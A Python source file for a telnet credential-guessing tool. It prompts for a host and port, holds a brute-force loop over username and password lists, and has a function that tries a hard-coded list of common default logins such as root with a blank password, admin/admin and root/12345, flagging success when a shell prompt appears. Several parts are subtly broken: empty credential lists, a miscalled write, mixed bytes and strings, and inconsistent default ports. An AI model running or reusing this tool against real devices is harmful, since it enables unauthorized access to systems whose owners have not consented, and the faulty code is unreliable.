# THIS MODULE WILL BE USED FOR BRUTEFORCING TELNET


# UI IMPORTS
from rich.console import Console
console = Console()


# NETWORK IMPORTS
import telnetlib3, ipaddress
from telnetlib3 import Telnet


# ETC IMPORTS
import asyncio


class Telnet_Brute_Forcer():
    """This will be used to bruteforce telnet"""


    @classmethod
    def _who(cls):
        """Who to bruteforce"""


        host = console.input(f"\n[bold green]Enter host: ").strip() or "192.168.1.172"
        port = console.input(f"[bold green]Enter port: ").strip()   or 23
        if not host: console.print("[bold red]Please enter a valid host")
        #host = ipaddress.ip_address(address=host)
        if not port: port = 22

        console.print(host, port)
        return host, port


    @classmethod
    async def _brute_forcer(cls, host, port, verbose=True):
        """Brute telnet"""

        usernames = []
        passwords = []
        valids = []



        reader, writer = await telnetlib3.open_connection(host=host, port=port, connect_maxwait=0.5)
        console.print("[bold yellow][*] Shell Activated!")


        for username in usernames:
            for password in passwords:

                try:

                    creds = (f"Username: {username} - Password: {password}")

                    await reader.readuntil('login:');    writer.write(username + "\n")
                    await reader.readuntil('password:'); writer.write(password, '\n')

                    await asyncio.sleep(1)
                    output = await reader.read(2048)

                    if output in valids:
                        
                        console.print(f"[bold green][+] Valid Credentials Found!: {creds}")
                        return True
                    

                    if verbose: console.print(f"[bold red][-] Invalid Credentials: {creds}")

                    

                    console.print(output)
                

                except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}")


    async def validate_default_telnet_creds(host, port, verbose=True):
        """
        Validate presence of default credentials on exposed telnet service.
        This is NOT brute force.
        """

        # Explicit, documented defaults only
        credentials = [
            ("root", ""),
            ("admin", ""),
            ("root", "root"),
            ("admin", "admin"),
            ("admin", "12345"),
            ("root", "12345"),
            ("root", "admin"),
            ("support", "support"),
            ("user", "user"),
        ]


        for username, password in credentials:
            try:
                reader, writer = await telnetlib3.open_connection(
                    host=host,
                    port=port,
                    connect_maxwait=0.5
                )

                if verbose:
                    print(f"[*] Testing {username}:{password or '(blank)'}")

                await reader.readuntil(b"login:")
                output = await reader.read(2048); console.print(output)
                writer.write(username + "\n")

                await reader.readuntil(b"Password:")
                writer.write(password + "\n")

                await asyncio.sleep(1)
                output = await reader.read(2048)
                console.print(output)

                writer.close()

                if "#" in output or "$" in output:
                    print(f"[+] VALID DEFAULT CREDS FOUND → {username}:{password or '(blank)'}")
                    print(output)
                    return True

                if verbose:
                    print("[-] Invalid\n")

            except Exception as e:
                print(f"[!] Error: {e}")

        return False



            

    @classmethod
    def main(cls):
        """Begin class"""


        host, port = Telnet_Brute_Forcer._who()
        asyncio.run(Telnet_Brute_Forcer.validate_default_telnet_creds(host=host, port=23))
        #asyncio.run(Telnet_Brute_Forcer._brute_forcer(host=host, port=port))


if __name__ == "__main__":
    Telnet_Brute_Forcer.main()
